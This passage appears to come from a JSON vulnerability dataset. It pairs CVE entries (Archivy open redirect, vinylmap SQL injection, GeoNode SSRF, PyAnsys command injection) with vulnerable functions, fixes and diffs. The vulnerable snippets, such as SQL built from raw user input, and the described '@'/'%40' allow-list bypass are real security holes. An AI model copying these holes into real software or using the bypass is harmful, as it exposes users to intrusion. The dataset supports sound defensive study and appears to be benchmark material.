title=\"New Bookmark\", form=form)\n\n\n@app.route(\"/notes/new\", methods=[\"GET\", \"POST\"])\ndef new_note():\n    form = forms.NewNoteForm()\n    default_dir = \"root directory\"\n    form.path.choices = [(\"\", default_dir)] + [\n        (pathname, pathname) for pathname in data.get_dirs()\n    ]\n    if form.validate_on_submit():\n        path = form.path.data\n        tags = form.tags.data.split(\",\") if form.tags.data != \"\" else []\n        tags = [tag.strip() for tag in tags]\n        note = DataObj(title=form.title.data, path=path, tags=tags, type=\"note\")\n        note_id = note.insert()\n        if note_id:\n            flash(\"Note Saved!\", \"success\")\n            return redirect(f\"/dataobj/{note_id}\")\n    path = request.args.get(\"path\", default_dir).strip(\"/\")\n    # handle empty argument\n    form.path.data = path\n    return render_template(\"/dataobjs/new.html\", title=\"New Note\", form=form)\n\n\n@app.route(\"/tags\")\ndef show_all_tags():\n    if not app.config[\"SEARCH_CONF\"][\"engine\"] == \"ripgrep\" and not which(\"rg\"):\n        flash(\"Ripgrep must be installed to view pages about embedded tags.\", \"error\")\n        return redirect(\"/\")\n    tags = sorted(get_all_tags(force=True))\n    return render_template(\"tags/all.html\", title=\"All Tags\", tags=tags)\n\n\n@app.route(\"/tags/<tag_name>\")\ndef show_tag(tag_name):\n    if not app.config[\"SEARCH_CONF\"][\"enabled\"] and not which(\"rg\"):\n        flash(\n            \"Search (for example ripgrep) must be installed to view pages about embedded tags.\",\n            \"error\",\n        )\n        return redirect(\"/\")\n\n    results = search(f\"#{tag_name}#\", strict=True)\n    res_ids = set(\n        [item[\"id\"] for item in results]\n    )  # avoid duplication of results between context-aware embedded tags and metadata ones\n    for res in search_frontmatter_tags(tag_name):\n        if res[\"id\"] not in res_ids:\n            results.append(res)\n\n    return render_template(\n        \"tags/show.html\",\n        title=f\"Tags - {tag_name}\",\n        tag_name=tag_name,\n        search_result=results,\n    )\n\n\n@app.route(\"/dataobj/<int:dataobj_id>\")\ndef show_dataobj(dataobj_id):\n    dataobj = data.get_item(dataobj_id)\n    get_title_id_pairs = lambda x: (x[\"title\"], x[\"id\"])\n    titles = list(\n        map(get_title_id_pairs, data.get_items(structured=False, load_content=False))\n    )\n\n    if not dataobj:\n        flash(\"Data could not be found!\", \"error\")\n        return redirect(\"/\")\n\n    if request.args.get(\"raw\") == \"1\":\n        return frontmatter.dumps(dataobj)\n\n    backlinks = []\n    if app.config[\"SEARCH_CONF\"][\"enabled\"]:\n        if app.config[\"SEARCH_CONF\"][\"engine\"] == \"ripgrep\":\n            query = f\"\\|{dataobj_id}]]\"\n        else:\n            query = f\"|{dataobj_id})]]\"\n        backlinks = search(query, strict=True)\n\n    # Form for moving data into another folder\n    move_form = forms.MoveItemForm()\n    move_form.path.choices = [(\"\", \"root directory\")] + [\n        (pathname, pathname) for pathname in data.get_dirs()\n    ]\n\n    post_title_form = forms.TitleForm()\n    post_title_form.title.data = dataobj[\"title\"]\n\n    # Get all tags\n    tag_list = get_all_tags()\n    # and the ones present in this dataobj\n    embedded_tags = set()\n    PATTERN = r\"(?:^|\\n| )#(?:[-_a-zA-Z\\u00c0-\\u00d6\\u00d8-\\u00f6\\u00f8-\\u00ff0-9]+)#\"\n    for match in re.finditer(PATTERN, dataobj.content):\n        embedded_tags.add(match.group(0).replace(\"#\", \"\").lstrip())\n\n    return render_template(\n        \"dataobjs/show.html\",\n        title=dataobj[\"title\"],\n        dataobj=dataobj,\n        backlinks=backlinks,\n        current_path=dataobj[\"dir\"],\n        form=forms.DeleteDataForm(),\n        view_only=0,\n        search_enabled=app.config[\"SEARCH_CONF\"][\"enabled\"],\n        post_title_form=post_title_form,\n        move_form=move_form,\n        tag_list=tag_list,\n        embedded_tags=embedded_tags,\n        titles=titles,\n    )\n\n\n@app.route(\"/dataobj/move/<int:dataobj_id>\", methods=[\"POST\"])\ndef move_item(dataobj_id):\n    form = forms.MoveItemForm()\n    out_dir = form.path.data if form.path.data != \"\" else \"root directory\"\n    if form.path.data == None:\n        flash(\"No path specified.\")\n        return redirect(f\"/dataobj/{dataobj_id}\")\n    try:\n        if data.move_item(dataobj_id, form.path.data):\n            flash(f\"Data successfully moved to {out_dir}.\", \"success\")\n            return redirect(f\"/dataobj/{dataobj_id}\")\n        else:\n            flash(f\"Data could not be moved to {out_dir}.\", \"error\")\n            return redirect(f\"/dataobj/{dataobj_id}\")\n    except FileNotFoundError:\n        flash(\"Data not found.\", \"error\")\n        return redirect(\"/\")\n    except FileExistsError:\n        flash(\"Data already in target directory.\", \"error\")\n        return redirect(f\"/dataobj/{dataobj_id}\")\n\n\n@app.route(\"/dataobj/delete/<int:dataobj_id>\", methods=[\"POST\"])\ndef delete_data(dataobj_id):\n    try:\n        data.delete_item(dataobj_id)\n    except BaseException:\n        flash(\"Data could not be found!\", \"error\")\n        return redirect(\"/\")\n    flash(\"Data deleted!\", \"success\")\n    return redirect(\"/\")\n\n\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    form = forms.UserForm()\n    if form.validate_on_submit():\n        db = get_db()\n        user = db.search(\n            (Query().username == form.username.data) & (Query().type == \"user\")\n        )\n\n        if user and check_password_hash(user[0][\"hashed_password\"], form.password.data):\n            user = User.from_db(user[0])\n            login_user(user, remember=True)\n            flash(\"Login successful!\", \"success\")\n\n            next_url = request.args.get(\"next\")\n            return redirect(next_url or \"/\")\n\n        flash(\"Invalid credentials\", \"error\")\n        return redirect(\"/login\")\n    return render_template(\"users/login.html\", form=form, title=\"Login\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_319_1",
        "commit": "2d8cb29",
        "file_path": "archivy/routes.py",
        "start_line": "41",
        "end_line": "274",
        "snippet": "@app.before_request\ndef check_perms():\n    allowed_path = (\n        request.path.startswith(\"/login\")\n        or request.path.startswith(\"/static\")\n        or request.path.startswith(\"/api/login\")\n    )\n    if not current_user.is_authenticated and not allowed_path:\n        return redirect(url_for(\"login\", next=request.path))\n    return\n\n\n@app.route(\"/\")\n@app.route(\"/index\")\ndef index():\n    path = request.args.get(\"path\", \"\").lstrip(\"/\")\n    try:\n        files = data.get_items(path=path)\n    except FileNotFoundError:\n        flash(\"Directory does not exist.\", \"error\")\n        return redirect(\"/\")\n\n    return render_template(\n        \"home.html\",\n        title=path or \"root\",\n        search_enabled=app.config[\"SEARCH_CONF\"][\"enabled\"],\n        dir=files,\n        current_path=path,\n        new_folder_form=forms.NewFolderForm(),\n        delete_form=forms.DeleteFolderForm(),\n        rename_form=forms.RenameDirectoryForm(),\n        view_only=0,\n        search_engine=app.config[\"SEARCH_CONF\"][\"engine\"],\n    )\n\n\n# TODO: refactor two following methods\n@app.route(\"/bookmarks/new\", methods=[\"GET\", \"POST\"])\ndef new_bookmark():\n    default_dir = app.config.get(\"DEFAULT_BOOKMARKS_DIR\", \"root directory\")\n    form = forms.NewBookmarkForm(path=default_dir)\n    form.path.choices = [(\"\", \"root directory\")] + [\n        (pathname, pathname) for pathname in data.get_dirs()\n    ]\n    if form.validate_on_submit():\n        path = form.path.data\n        tags = form.tags.data.split(\",\") if form.tags.data != \"\" else []\n        tags = [tag.strip() for tag in tags]\n        bookmark = DataObj(url=form.url.data, tags=tags, path=path, type=\"bookmark\")\n        bookmark.process_bookmark_url()\n        bookmark_id = bookmark.insert()\n        if bookmark_id:\n            flash(\"Bookmark Saved!\", \"success\")\n            return redirect(f\"/dataobj/{bookmark_id}\")\n        else:\n            flash(bookmark.error, \"error\")\n            return redirect(\"/bookmarks/new\")\n    # for bookmarklet\n    form.url.data = request.args.get(\"url\", \"\")\n    path = request.args.get(\"path\", default_dir).strip(\"/\")\n    # handle empty argument\n    form.path.data = path\n    return render_template(\"dataobjs/new.html\", title=\"New Bookmark\", form=form)\n\n\n@app.route(\"/notes/new\", methods=[\"GET\", \"POST\"])\ndef new_note():\n    form = forms.NewNoteForm()\n    default_dir = \"root directory\"\n    form.path.choices = [(\"\", default_dir)] + [\n        (pathname, pathname) for pathname in data.get_dirs()\n    ]\n    if form.validate_on_submit():\n        path = form.path.data\n        tags = form.tags.data.split(\",\") if form.tags.data != \"\" else []\n        tags = [tag.strip() for tag in tags]\n        note = DataObj(title=form.title.data, path=path, tags=tags, type=\"note\")\n        note_id = note.insert()\n        if note_id:\n            flash(\"Note Saved!\", \"success\")\n            return redirect(f\"/dataobj/{note_id}\")\n    path = request.args.get(\"path\", default_dir).strip(\"/\")\n    # handle empty argument\n    form.path.data = path\n    return render_template(\"/dataobjs/new.html\", title=\"New Note\", form=form)\n\n\n@app.route(\"/tags\")\ndef show_all_tags():\n    if not app.config[\"SEARCH_CONF\"][\"engine\"] == \"ripgrep\" and not which(\"rg\"):\n        flash(\"Ripgrep must be installed to view pages about embedded tags.\", \"error\")\n        return redirect(\"/\")\n    tags = sorted(get_all_tags(force=True))\n    return render_template(\"tags/all.html\", title=\"All Tags\", tags=tags)\n\n\n@app.route(\"/tags/<tag_name>\")\ndef show_tag(tag_name):\n    if not app.config[\"SEARCH_CONF\"][\"enabled\"] and not which(\"rg\"):\n        flash(\n            \"Search (for example ripgrep) must be installed to view pages about embedded tags.\",\n            \"error\",\n        )\n        return redirect(\"/\")\n\n    results = search(f\"#{tag_name}#\", strict=True)\n    res_ids = set(\n        [item[\"id\"] for item in results]\n    )  # avoid duplication of results between context-aware embedded tags and metadata ones\n    for res in search_frontmatter_tags(tag_name):\n        if res[\"id\"] not in res_ids:\n            results.append(res)\n\n    return render_template(\n        \"tags/show.html\",\n        title=f\"Tags - {tag_name}\",\n        tag_name=tag_name,\n        search_result=results,\n    )\n\n\n@app.route(\"/dataobj/<int:dataobj_id>\")\ndef show_dataobj(dataobj_id):\n    dataobj = data.get_item(dataobj_id)\n    get_title_id_pairs = lambda x: (x[\"title\"], x[\"id\"])\n    titles = list(\n        map(get_title_id_pairs, data.get_items(structured=False, load_content=False))\n    )\n\n    if not dataobj:\n        flash(\"Data could not be found!\", \"error\")\n        return redirect(\"/\")\n\n    if request.args.get(\"raw\") == \"1\":\n        return frontmatter.dumps(dataobj)\n\n    backlinks = []\n    if app.config[\"SEARCH_CONF\"][\"enabled\"]:\n        if app.config[\"SEARCH_CONF\"][\"engine\"] == \"ripgrep\":\n            query = f\"\\|{dataobj_id}]]\"\n        else:\n            query = f\"|{dataobj_id})]]\"\n        backlinks = search(query, strict=True)\n\n    # Form for moving data into another folder\n    move_form = forms.MoveItemForm()\n    move_form.path.choices = [(\"\", \"root directory\")] + [\n        (pathname, pathname) for pathname in data.get_dirs()\n    ]\n\n    post_title_form = forms.TitleForm()\n    post_title_form.title.data = dataobj[\"title\"]\n\n    # Get all tags\n    tag_list = get_all_tags()\n    # and the ones present in this dataobj\n    embedded_tags = set()\n    PATTERN = r\"(?:^|\\n| )#(?:[-_a-zA-Z\\u00c0-\\u00d6\\u00d8-\\u00f6\\u00f8-\\u00ff0-9]+)#\"\n    for match in re.finditer(PATTERN, dataobj.content):\n        embedded_tags.add(match.group(0).replace(\"#\", \"\").lstrip())\n\n    return render_template(\n        \"dataobjs/show.html\",\n        title=dataobj[\"title\"],\n        dataobj=dataobj,\n        backlinks=backlinks,\n        current_path=dataobj[\"dir\"],\n        form=forms.DeleteDataForm(),\n        view_only=0,\n        search_enabled=app.config[\"SEARCH_CONF\"][\"enabled\"],\n        post_title_form=post_title_form,\n        move_form=move_form,\n        tag_list=tag_list,\n        embedded_tags=embedded_tags,\n        titles=titles,\n    )\n\n\n@app.route(\"/dataobj/move/<int:dataobj_id>\", methods=[\"POST\"])\ndef move_item(dataobj_id):\n    form = forms.MoveItemForm()\n    out_dir = form.path.data if form.path.data != \"\" else \"root directory\"\n    if form.path.data == None:\n        flash(\"No path specified.\")\n        return redirect(f\"/dataobj/{dataobj_id}\")\n    try:\n        if data.move_item(dataobj_id, form.path.data):\n            flash(f\"Data successfully moved to {out_dir}.\", \"success\")\n            return redirect(f\"/dataobj/{dataobj_id}\")\n        else:\n            flash(f\"Data could not be moved to {out_dir}.\", \"error\")\n            return redirect(f\"/dataobj/{dataobj_id}\")\n    except FileNotFoundError:\n        flash(\"Data not found.\", \"error\")\n        return redirect(\"/\")\n    except FileExistsError:\n        flash(\"Data already in target directory.\", \"error\")\n        return redirect(f\"/dataobj/{dataobj_id}\")\n\n\n@app.route(\"/dataobj/delete/<int:dataobj_id>\", methods=[\"POST\"])\ndef delete_data(dataobj_id):\n    try:\n        data.delete_item(dataobj_id)\n    except BaseException:\n        flash(\"Data could not be found!\", \"error\")\n        return redirect(\"/\")\n    flash(\"Data deleted!\", \"success\")\n    return redirect(\"/\")\n\n\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    form = forms.UserForm()\n    if form.validate_on_submit():\n        db = get_db()\n        user = db.search(\n            (Query().username == form.username.data) & (Query().type == \"user\")\n        )\n\n        if user and check_password_hash(user[0][\"hashed_password\"], form.password.data):\n            user = User.from_db(user[0])\n            login_user(user, remember=True)\n            flash(\"Login successful!\", \"success\")\n\n            next_url = request.args.get(\"next\")\n            if next_url and is_safe_redirect_url(next_url):\n                return redirect(next_url)\n            else:\n                return redirect(\"/\")\n\n        flash(\"Invalid credentials\", \"error\")\n        return redirect(\"/login\")\n    return render_template(\"users/login.html\", form=form, title=\"Login\")"
      },
      {
        "id": "fix_py_319_2",
        "commit": "2d8cb29",
        "file_path": "archivy/helpers.py",
        "start_line": "236",
        "end_line": "242",
        "snippet": "def is_safe_redirect_url(target):\n    host_url = urlparse(request.host_url)\n    redirect_url = urlparse(urljoin(request.host_url, target))\n    return (\n        redirect_url.scheme in (\"http\", \"https\")\n        and host_url.netloc == redirect_url.netloc\n    )"
      }
    ],
    "vul_patch": "--- a/archivy/routes.py\n+++ b/archivy/routes.py\n@@ -224,7 +224,10 @@\n             flash(\"Login successful!\", \"success\")\n \n             next_url = request.args.get(\"next\")\n-            return redirect(next_url or \"/\")\n+            if next_url and is_safe_redirect_url(next_url):\n+                return redirect(next_url)\n+            else:\n+                return redirect(\"/\")\n \n         flash(\"Invalid credentials\", \"error\")\n         return redirect(\"/login\")\n\n--- /dev/null\n+++ b/archivy/routes.py\n@@ -0,0 +1,7 @@\n+def is_safe_redirect_url(target):\n+    host_url = urlparse(request.host_url)\n+    redirect_url = urlparse(urljoin(request.host_url, target))\n+    return (\n+        redirect_url.scheme in (\"http\", \"https\")\n+        and host_url.netloc == redirect_url.netloc\n+    )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-10056",
    "cve_description": "A vulnerability was found in 2071174A vinylmap. It has been classified as critical. Affected is the function contact of the file recordstoreapp/views.py. The manipulation leads to sql injection. The name of the patch is b07b79a1e92cc62574ba0492cce000ef4a7bd25f. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-218400.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/2071174A/vinylmap",
    "patch_url": [
      "https://github.com/2071174A/vinylmap/commit/b07b79a1e92cc62574ba0492cce000ef4a7bd25f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_378_1",
        "commit": "781d517b0d234d3fb51c9cb46584f0cf58e67675",
        "file_path": "recordstoreapp/views.py",
        "start_line": 25,
        "end_line": 47,
        "snippet": "def search(request):\n\tcontext_dict = {}\n\tif 'q' in request.GET and request.GET['q'] != '':\n\t\tq = request.GET['q']\n\t\tcursor = connection.cursor()\n\t\tcursor.execute(\"SELECT id,title,artist,cover FROM recordstoreapp_record WHERE title like '%\" + q + \"%' or artist like '%\" + q + \"%' or label like '%\" + q + \"%' or cat_no like '%\" + q + \"%';\")\n\t\trec_list=cursor.fetchall()\n\t\t\n\t\ttotal=len(rec_list)\n\t\tpg=int(request.GET['page']) if 'page' in request.GET else 1\n\t\tub=min(pg*12, total)\n\n\t\tcontext_dict['rec_list'] = rec_list[(pg-1)*12:ub]\n\t\tmaxrange = int(total/12)\n\t\tif total%12 > 0: \n\t\t\tmaxrange = maxrange + 1\n\t\tif maxrange == 1: \n\t\t\tmaxrange = 0\n\t\tcontext_dict['range'] = range(1,maxrange+1)\n\t\tprint total\n\t\tcontext_dict['q'] = q\n\n\treturn render(request, 'search.html', context_dict)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_378_1",
        "commit": "b07b79a1e92cc62574ba0492cce000ef4a7bd25f",
        "file_path": "recordstoreapp/views.py",
        "start_line": 25,
        "end_line": 49,
        "snippet": "def search(request):\n\tcontext_dict = {}\n\tq = request.GET['q'].replace('%', '').replace('_', '').strip()\n\tif 'q' in request.GET and q != '':\n\t\tq = '%' + q + '%'\n\t\tcursor = connection.cursor()\n\t\tcursor.execute(\"SELECT id,title,artist,cover FROM recordstoreapp_record WHERE title like %s or artist like %s or label like %s or cat_no like %s;\", [q,q,q,q])\n\t\trec_list=cursor.fetchall()\n\t\t\n\n\t\ttotal=len(rec_list)\n\t\tpg=int(request.GET['page']) if 'page' in request.GET else 1\n\t\tub=min(pg*12, total)\n\n\t\tcontext_dict['rec_list'] = rec_list[(pg-1)*12:ub]\n\t\tmaxrange = int(total/12)\n\t\tif total%12 > 0: \n\t\t\tmaxrange = maxrange + 1\n\t\tif maxrange == 1: \n\t\t\tmaxrange = 0\n\t\tcontext_dict['range'] = range(1,maxrange+1)\n\t\tprint total\n\t\tcontext_dict['q'] = q\n\n\treturn render(request, 'search.html', context_dict)"
      }
    ],
    "vul_patch": "--- a/recordstoreapp/views.py\n+++ b/recordstoreapp/views.py\n@@ -1,11 +1,13 @@\n def search(request):\n \tcontext_dict = {}\n-\tif 'q' in request.GET and request.GET['q'] != '':\n-\t\tq = request.GET['q']\n+\tq = request.GET['q'].replace('%', '').replace('_', '').strip()\n+\tif 'q' in request.GET and q != '':\n+\t\tq = '%' + q + '%'\n \t\tcursor = connection.cursor()\n-\t\tcursor.execute(\"SELECT id,title,artist,cover FROM recordstoreapp_record WHERE title like '%\" + q + \"%' or artist like '%\" + q + \"%' or label like '%\" + q + \"%' or cat_no like '%\" + q + \"%';\")\n+\t\tcursor.execute(\"SELECT id,title,artist,cover FROM recordstoreapp_record WHERE title like %s or artist like %s or label like %s or cat_no like %s;\", [q,q,q,q])\n \t\trec_list=cursor.fetchall()\n \t\t\n+\n \t\ttotal=len(rec_list)\n \t\tpg=int(request.GET['page']) if 'page' in request.GET else 1\n \t\tub=min(pg*12, total)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-42439",
    "cve_description": "GeoNode is an open source platform that facilitates the creation, sharing, and collaborative use of geospatial data. A SSRF vulnerability exists starting in version 3.2.0, bypassing existing controls on the software. This can allow a user to request internal services for a full read SSRF, returning any data from the internal network. The application is using a whitelist, but the whitelist can be bypassed. The bypass will trick the application that the first host is a whitelisted address, but the browser will use `@` or `%40` as a credential to the host geoserver on port 8080, this will return the data to that host on the response. Version 4.1.3.post1 is the first available version that contains a patch.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/GeoNode/geonode",
    "patch_url": [
      "https://github.com/GeoNode/geonode/commit/79ac6e70419c2e0261548bed91c159b54ff35b8d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_261_1",
        "commit": "abd1baf",
        "file_path": "geonode/utils.py",
        "start_line": 1910,
        "end_line": 1927,
        "snippet": "def extract_ip_or_domain(url):\n    ip_regex = re.compile(\"^(?:http://|https://)(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3})\")\n    domain_regex = re.compile(\"^(?:http://|https://)([a-zA-Z0-9.-]+)\")\n\n    match = ip_regex.findall(url)\n    if len(match):\n        ip_address = match[0]\n        try:\n            ipaddress.ip_address(ip_address)  # Validate the IP address\n            return ip_address\n        except ValueError:\n            pass\n\n    match = domain_regex.findall(url)\n    if len(match):\n        return match[0]\n\n    return None"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_261_2",
        "commit": "79ac6e7",
        "file_path": "geonode/utils.py",
        "start_line": 1911,
        "end_line": 1921,
        "snippet": "def remove_credentials_from_url(url):\n    # Parse the URL\n    parsed_url = urlparse(url)\n\n    # Remove the username and password from the parsed URL\n    parsed_url = parsed_url._replace(netloc=parsed_url.netloc.split(\"@\")[-1])\n\n    # Reconstruct the URL without credentials\n    cleaned_url = urlunparse(parsed_url)\n\n    return cleaned_url"
      },
      {
        "id": "fix_py_261_1",
        "commit": "79ac6e7",
        "file_path": "geonode/utils.py",
        "start_line": 1924,
        "end_line": 1944,
        "snippet": "def extract_ip_or_domain(url):\n    # Decode the URL to handle percent-encoded characters\n    _url = remove_credentials_from_url(unquote(url))\n\n    ip_regex = re.compile(\"^(?:http://|https://)(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3})\")\n    domain_regex = re.compile(\"^(?:http://|https://)([a-zA-Z0-9.-]+)\")\n\n    match = ip_regex.findall(_url)\n    if len(match):\n        ip_address = match[0]\n        try:\n            ipaddress.ip_address(ip_address)  # Validate the IP address\n            return ip_address\n        except ValueError:\n            pass\n\n    match = domain_regex.findall(_url)\n    if len(match):\n        return match[0]\n\n    return None"
      }
    ],
    "vul_patch": "--- a/geonode/utils.py\n+++ b/geonode/utils.py\n@@ -1,8 +1,11 @@\n def extract_ip_or_domain(url):\n+    # Decode the URL to handle percent-encoded characters\n+    _url = remove_credentials_from_url(unquote(url))\n+\n     ip_regex = re.compile(\"^(?:http://|https://)(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3})\")\n     domain_regex = re.compile(\"^(?:http://|https://)([a-zA-Z0-9.-]+)\")\n \n-    match = ip_regex.findall(url)\n+    match = ip_regex.findall(_url)\n     if len(match):\n         ip_address = match[0]\n         try:\n@@ -11,7 +14,7 @@\n         except ValueError:\n             pass\n \n-    match = domain_regex.findall(url)\n+    match = domain_regex.findall(_url)\n     if len(match):\n         return match[0]\n \n\n--- /dev/null\n+++ b/geonode/utils.py\n@@ -0,0 +1,11 @@\n+def remove_credentials_from_url(url):\n+    # Parse the URL\n+    parsed_url = urlparse(url)\n+\n+    # Remove the username and password from the parsed URL\n+    parsed_url = parsed_url._replace(netloc=parsed_url.netloc.split(\"@\")[-1])\n+\n+    # Reconstruct the URL without credentials\n+    cleaned_url = urlunparse(parsed_url)\n+\n+    return cleaned_url\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-29189",
    "cve_description": "PyAnsys Geometry is a Python client library for the Ansys Geometry service and other CAD Ansys products. On file src/ansys/geometry/core/connection/product_instance.py, upon calling this method _start_program directly, users could exploit its usage to perform malicious operations on the current machine where the script is ran. This vulnerability is fixed in 0.3.3 and 0.4.12.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ansys/pyansys-geometry",
    "patch_url": [
      "https://github.com/ansys/pyansys-geometry/commit/f82346b9432b06532e84f3278125f5879b4e9f3f",
      "https://github.com/ansys/pyansys-geometry/commit/902071701c4f3a8258cbaa46c28dc0a65442d1bc"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_385_1",
        "commit": "138ae18f810b3e556f90ca12164fc68bc76f063c",
        "file_path": "src/ansys/geometry/core/connection/product_instance.py",
        "start_line": 170,
        "end_line": 311,
        "snippet": "def prepare_and_start_backend(\n    backend_type: BackendType,\n    product_version: int = None,\n    host: str = \"localhost\",\n    port: int = None,\n    enable_trace: bool = False,\n    log_level: int = 2,\n    api_version: ApiVersions = ApiVersions.LATEST,\n    timeout: int = 150,\n    manifest_path: str = None,\n    logs_folder: str = None,\n    hidden: bool = False,\n) -> \"Modeler\":\n    \"\"\"\n    Start the requested service locally using the ``ProductInstance`` class.\n\n    When calling this method, a standalone service or product session is started.\n    By default, if an endpoint is specified (by defining `host` and `port` parameters)\n    but the endpoint is not available, the startup will fail. Otherwise, it will try to\n    launch its own service.\n\n    Parameters\n    ----------\n    product_version: ``int``, optional\n        The product version to be started. Goes from v23.2.1 to\n        the latest. Default is ``None``.\n        If a specific product version is requested but not installed locally,\n        a SystemError will be raised.\n    host: str, optional\n        IP address at which the Geometry service will be deployed. By default,\n        its value will be ``localhost``.\n    port : int, optional\n        Port at which the Geometry service will be deployed. By default, its\n        value will be ``None``.\n    enable_trace : bool, optional\n        Boolean enabling the logs trace on the Geometry service console window.\n        By default its value is ``False``.\n    log_level : int, optional\n        Backend's log level from 0 to 3:\n            0: Chatterbox\n            1: Debug\n            2: Warning\n            3: Error\n\n        The default is ``2`` (Warning).\n    api_version: ``ApiVersions``, optional\n        The backend's API version to be used at runtime. Goes from API v21 to\n        the latest. Default is ``ApiVersions.LATEST``.\n    timeout : int, optional\n        Timeout for starting the backend startup process. The default is 150.\n    manifest_path : str, optional\n        Used to specify a manifest file path for the ApiServerAddin. This way,\n        it is possible to run an ApiServerAddin from a version an older product\n        version. Only applicable for Ansys Discovery and Ansys SpaceClaim.\n    logs_folder : sets the backend's logs folder path. If nothing is defined,\n        the backend will use its default path.\n    hidden : starts the product hiding its UI. Default is ``False``.\n\n    Raises\n    ------\n    ConnectionError\n        If the specified endpoint is already in use, a connection error will be raised.\n    SystemError\n        If there is not an Ansys product 23.2 version or later installed\n        or if a specific product's version is requested but not installed locally then\n        a SystemError will be raised.\n\n    Returns\n    -------\n    Modeler\n        Instance of the Geometry service.\n    \"\"\"\n    from ansys.geometry.core.modeler import Modeler\n\n    port = _check_port_or_get_one(port)\n    installations = get_available_ansys_installations()\n    if product_version != None:\n        _check_version_is_available(product_version, installations)\n    else:\n        product_version = get_latest_ansys_installation()[0]\n        _check_minimal_versions(product_version)\n\n    args = []\n    env_copy = _get_common_env(\n        host=host,\n        port=port,\n        enable_trace=enable_trace,\n        log_level=log_level,\n        logs_folder=logs_folder,\n    )\n\n    if backend_type == BackendType.DISCOVERY:\n        args.append(os.path.join(installations[product_version], DISCOVERY_FOLDER, DISCOVERY_EXE))\n        if hidden is True:\n            args.append(BACKEND_DISCOVERY_HIDDEN)\n\n        # Here begins the spaceclaim arguments.\n        args.append(BACKEND_SPACECLAIM_OPTIONS)\n        args.append(\n            BACKEND_ADDIN_MANIFEST_ARGUMENT\n            + _manifest_path_provider(product_version, installations, manifest_path)\n        )\n        env_copy[BACKEND_API_VERSION_VARIABLE] = str(api_version)\n\n    elif backend_type == BackendType.SPACECLAIM:\n        args.append(os.path.join(installations[product_version], SPACECLAIM_FOLDER, SPACECLAIM_EXE))\n        if hidden is True:\n            args.append(BACKEND_SPACECLAIM_HIDDEN)\n            args.append(BACKEND_SPLASH_OFF)\n        args.append(\n            BACKEND_ADDIN_MANIFEST_ARGUMENT\n            + _manifest_path_provider(product_version, installations, manifest_path)\n        )\n        env_copy[BACKEND_API_VERSION_VARIABLE] = str(api_version)\n        env_copy[BACKEND_SPACECLAIM_HIDDEN_ENVVAR_KEY] = BACKEND_SPACECLAIM_HIDDEN_ENVVAR_VALUE\n\n    elif backend_type == BackendType.WINDOWS_SERVICE:\n        latest_version = get_latest_ansys_installation()[0]\n        args.append(\n            os.path.join(\n                installations[latest_version], WINDOWS_GEOMETRY_SERVICE_FOLDER, GEOMETRY_SERVICE_EXE\n            )\n        )\n    else:\n        raise RuntimeError(\n            f\"Cannot connect to backend {backend_type.name} using ``prepare_and_start_backend()``\"\n        )\n\n    LOG.info(f\"Launching ProductInstance for {backend_type.name}\")\n    LOG.debug(f\"Args: {args}\")\n    LOG.debug(f\"Environment variables: {env_copy}\")\n\n    instance = ProductInstance(_start_program(args, env_copy).pid)\n\n    # Verify that the backend is ready to accept connections\n    # before returning the Modeler instance.\n    LOG.info(\"Waiting for backend to be ready...\")\n    _wait_for_backend(host, port, timeout)\n\n    return Modeler(\n        host=host, port=port, timeout=timeout, product_instance=instance, backend_type=backend_type\n    )"
      },
      {
        "id": "vul_py_385_2",
        "commit": "138ae18f810b3e556f90ca12164fc68bc76f063c",
        "file_path": "src/ansys/geometry/core/connection/product_instance.py",
        "start_line": 403,
        "end_line": 429,
